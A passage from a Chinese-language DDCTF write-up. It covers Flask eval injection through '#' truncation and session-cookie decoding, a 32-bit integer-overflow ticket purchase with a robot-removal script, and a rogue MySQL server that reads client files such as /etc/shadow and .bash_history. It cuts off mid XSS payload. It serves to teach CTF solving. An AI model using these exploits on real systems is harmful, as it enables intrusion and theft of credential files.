        if session['num_items'] >= 5: 
            trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries 
        trigger_event('action:view;index') 
    if __name__ == '__main__': 
        app.run(debug=False, host='0.0.0.0')
网址实现各种功能，是通过解析`query_string`进行跳转的，具体可以查看`execute_event_loop`函数代码。`query_string`示例如下：
    http://116.85.48.107:5002/d5afe1f66147e857/?action:buy;1
    http://116.85.48.107:5002/d5afe1f66147e857/?action:view;shop
提取关键代码测试，可以看到更加直观，代码如下：
    def get_mid_str(haystack, prefix, postfix=None):
        haystack = haystack[haystack.find(prefix)+len(prefix):]
        if postfix is not None:
            haystack = haystack[:haystack.find(postfix)]
        return haystack
    def ACTION_handler():pass
    event = 'action:ACTION;ARGS0#ARGS1#ARGS2'
    is_action = event[0] == 'a'
    action = get_mid_str(event, ':', ';')
    print '[!] action:',action
    args = get_mid_str(event, action+';').split('#')
    print '[!] args:',args
    event_handler = eval(action + ('_handler' if is_action else '_function'))
    print '[!] event_handler:',event_handler
运行结果：
    [!] action: ACTION
    [!] args: ['ARGS0', 'ARGS1', 'ARGS2']
    [!] event_handler: 
`event_handler`是用`eval`进行拼接，从而得到对应的处理函数，`eval`函数本质是将字符串str当成有效的表达式来求值并返回计算结果，程序过滤了大部分的特殊符号，导致我们不能随意进行代码注入，不过由于`ARGS`是使用`#`进行分隔，而`#`在python代码中是注释符，在`action`中加入`#`，可以把后面`_handler`注释掉。上面的代码用`event
= 'action:str#;ARGS0#ARGS1#ARGS2'`进行测试一下：
    [!] action: str#
    [!] args: ['ARGS0', 'ARGS1', 'ARGS2']
    [!] event_handler: 
现在，我们可以控制`event_handler`运行指定的函数，不过还有一个问题是`FLAG()`函数是不带参数的，而`args`为`list`，直接传入`action:FLAG;`将产生报错。
    TypeError: FLAG() takes no arguments (1 given)
直接调用`FLAG()`函数的方法走不通了，由于传入参数必须是`list`类型，python自带的全局函数也没有可以用（如果有求告知~），那么只能考虑自带函数。自带的函数不多，不难找到`trigger_event`。
    def trigger_event(event):
        session['log'].append(event)
        if len(session['log']) > 5: session['log'] = session['log'][-5:]
        if type(event) == type([]):
            request.event_queue += event
        else:
            request.event_queue.append(event)
    def execute_event_loop():
        valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
        resp = None
        while len(request.event_queue) > 0:
            event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
            request.event_queue = request.event_queue[1:]
            ...
参数`event`为`list`类型，`execute_event_loop`按顺序处理`request.event_queue`所有`event`，我们可以考虑构造一套组合拳来获取flag。具体构造思路如下：
  1. 程序调用`FLAG()`的地方只有一个，就是`get_flag_handler()`，对应的`event1=action:get_flag;`；
  2. `get_flag_handler()`会判断`session['num_items']>=5`，因此需要购买5个以上的钻石，对应的`event2=action:buy;5`；
  3. 传入`query_string=action:trigger_event#;{event1}#{event2}`，利用`#`截断，运行`trigger_event([event1,event2])`
此外，还有两个问题需要解决一下
  1. `show_flag_function()`把返回的FLAG注释掉了，FLAG只会加入到`show_flag_function()`参数中。
  2. `buy_handler()`后会调用`consume_point_function()`检查`point`是否足够，不然就会回滚。
`trigger_event`有一句代码`session['log'].append(event)`，会把记录各种函数的调用，那么自然会把`trigger_event('func:show_flag;'+FLAG())`存在放在`session['log']`中。留意到`execute_event_loop`是按先后顺序进行函数调用，因此`buy_handler()`后并不会马上执行`consume_point_function()`，如果后面紧跟是`show_flag_function()`，并不会受回滚影响。由于flag存放在session中，需要解密一下cookie，flask的session问题具体可以看看p神博客，[客户端
session 导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html)
最终payload：
    http://116.85.48.107:5002/d5afe1f66147e857/?action:trigger_event%23;action:buy;7%23action:get_flag;
    ERROR! All transactions have been cancelled. 
    Go back to index.html
获取到的cookie
    Set-Cookie: session=.eJyNjlFLwzAAhP-K5HkPbersUujLcCkM2uCsTRoRaZo5m6VZsOvmMvrfVwQFmQ--Hdzdd3cGercB0fMZ3AgQgZJmXkVRT8zqVFFpOFu-cca1MA-KQKxkog9C2UaybZidsvcyWFkBb-84LDwGeVfSOgTD5ArXLv113gWjdeVILTFqRYINOcYxGF5-2twUfemsEnDqJPU1C-aHik494ur4D5LhlrM6HBNbzjZfpN8gVyUo-H6ZBqWXFjMnVdZLPPtM7-dHBjHh45l8gfNHH6l0gT5S-vTPMWD69rXZr9sORP4E2F1j9qOEwwXM_XDJ.D5b-8w.YcblUXhGWeGzHVT6qLNwR2zCOV4; HttpOnly; Path=/
    #!/usr/bin/env python3
    import sys
    import zlib
    from hashlib import *
    from base64 import b64decode
    from flask.sessions import URLSafeTimedSerializer,session_json_serializer
    from itsdangerous import base64_decode
    def decryption(payload):
        payload, sig = payload.rsplit(b'.', 1)
        payload, timestamp = payload.rsplit(b'.', 1)
        decompress = False
        if payload.startswith(b'.'):
            payload = payload[1:]
            decompress = True
        try:
            payload = base64_decode(payload)
        except Exception as e:
            raise Exception('Could not base64 decode the payload because of '
                             'an exception')
        if decompress:
            try:
                payload = zlib.decompress(payload)
            except Exception as e:
                raise Exception('Could not zlib decompress the payload before '
                                 'decoding the payload')
        return session_json_serializer.loads(payload)
    sessions = '.eJyNjlFLwzAAhP-K5HkPbersUujLcCkM2uCsTRoRaZo5m6VZsOvmMvrfVwQFmQ--Hdzdd3cGercB0fMZ3AgQgZJmXkVRT8zqVFFpOFu-cca1MA-KQKxkog9C2UaybZidsvcyWFkBb-84LDwGeVfSOgTD5ArXLv113gWjdeVILTFqRYINOcYxGF5-2twUfemsEnDqJPU1C-aHik494ur4D5LhlrM6HBNbzjZfpN8gVyUo-H6ZBqWXFjMnVdZLPPtM7-dHBjHh45l8gfNHH6l0gT5S-vTPMWD69rXZr9sORP4E2F1j9qOEwwXM_XDJ.D5b-8w.YcblUXhGWeGzHVT6qLNwR2zCOV4'
    PAYLOAD = decryption(sessions.encode())
    print PAYLOAD
查看session的解析结果，函数的调用过程更加一目了然了。
    {u'points': 2, u'num_items': 1, u'log': ['action:trigger_event#;action:buy;7#action:get_flag;', ['action:buy;7', 'action:get_flag;'], ['func:consume_point;7', 'action:view;index'], 'func:show_flag;3v41_3v3nt_100p_aNd_fLASK_c0Ok1e', 'action:view;index']}
### 大吉大利，今晚吃鸡
正常情况下，新注册用户余额只有100，门票需要2000，是不够钱买门票，不过可以利用整数溢出
32位系统`unsigned
int`范围为`0～4294967295`，最大数`+1`后会回绕变成`0`，修改订单`ticket_price=4294967296`
    GET /ctf/api/buy_ticket?ticket_price=4294967296
后面拿到源码证实了猜想，对于大于32位的数字，程序进行了截断，导致了整数溢出。
    def num64_to_32(num):
        str_num = bin(num)
        if len(str_num) > 66:
            return False
        if 34  1:
                url = base_url + '/ctf/api/remove_robot?id=%s&ticket=%s' % (your_id, your_ticket)
                r = data[0]['session'].get(url)
                print(r.json())
                time.sleep(1)
                url = base_url + '/ctf/api/get_flag'
                r = data[0]['session'].get(url)
                print(r.json())
                if '大吉大利，今晚吃鸡' in r.json()['msg']:
                    print(r.json()['data'][0])
                    break
        except Exception as e:
            print(e)
            pass
得到flag，另外本题有非预期解，详见下一题。
    {'code': 200, 'data': ['DDCTF{chiken_dinner_hyMCX[n47Fx)}'], 'msg': '大吉大利，今晚吃鸡'}
### mysql弱口令
部署[agent.py](http://38.106.21.229:5100/agent.py)再进行扫描哦~
题目是一个mysql弱口令扫描器，输入主机IP及mysql端口可以进行扫描，扫描器会先连接`agent.py`起的端口`8123`，并且通过命令`netstat
-ntlp`检查主机端口开放情况，会检查是否存在`mysqld`进程。以前遇到的sql题目，一般我们作为客户端，对服务端进行注入等恶意攻击，这题刚好相反，题目是一个扫描器（客户端），而我们提供一个服务端。
  1. 用`mysql 读取 客户端 数据`作为关键字搜索，可以找到不少文章
[MySQL LOAD DATA 读取客户端任意文件](https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/)
原理是在mysql客户端连接到服务端的时候可以请求客户端的本地文件，可以通过伪造 `file-transfer`
请求实现任意文件读取，使用文章里面提到的工具：
可以修改端口，以及修改filelist为我们想读取的文件
    filelist = (
        '/etc/shadow',
    )
  1. 下载并启动`agent.py`，由于扫描器会检查是否有mysqld进程，可以将`python`软链接成`mysqld`再启动`rogue_mysql_server.py`。
    ln -s /usr/bin/python mysqld
    mysqld rogue_mysql_server.py
  1. 在扫描器中输入伪造MySQL服务的IP和端口，注意脚本都要用root权限运行，不然会出错。首先测试了一下读取`/etc/passwd`
  1. 开始各种读文件的找FLAG之旅
读取`/proc/self/cmdline` 可以看到启动命令
    /home/dc2-user/ctf_web_2/ctf_web_2/bin/python2 /home/dc2-user/ctf_web_2/ctf_web_2/bin/gunicorn didi_ctf_web2:app -b 127.0.0.1:15000 --access-logfile /home/dc2-user/ctf_web_2/2_access.log
是flask起的web，读取`/home/dc2-user/ctf_web_2/app/main/views.py`，里面有提示flag在security数据库的flag表里面：
    # flag in mysql  curl@localhost database:security  table:flag
读取mysql的数据库文件`/var/lib/mysql/security/flag.ibd`，flag明文存放在数据库中
    # kira @ k1r4 in ~/web/ddctf [21:09:55]
    $ strings flag.ibd
    z[jx
    infimum
    supremum
    DDCTF{0b5d05d80cceb4b85c8243c00b62a7cd}
番外篇：读取一下`/home/dc2-user/.bash_history`，发现了有趣的东西，这个服务器还有`ctf_web_1`
    mv ctf.zip  /home/dc2-user/ctf_web_1/web_1
猜测存在文件`/home/dc2-user/ctf_web_1/web_1/main/views.py`，直接拿到了吃鸡那题的flag，这就是上面提到的非预期解。
    from flask import jsonify, request,redirect
    from app import mongodb
    from app.unitis.tools import get_md5, num64_to_32
    from app.main.db_tools import get_balance, creat_env_db, search_bill, secrity_key, get_bill_id
    import uuid
    from urllib import unquote
    mydb = mongodb.db
    flag = '''DDCTF{chiken_dinner_hyMCX[n47Fx)}'''
### 欢迎报名DDCTF
提示xss，尝试把html源码x回来，payload：`<script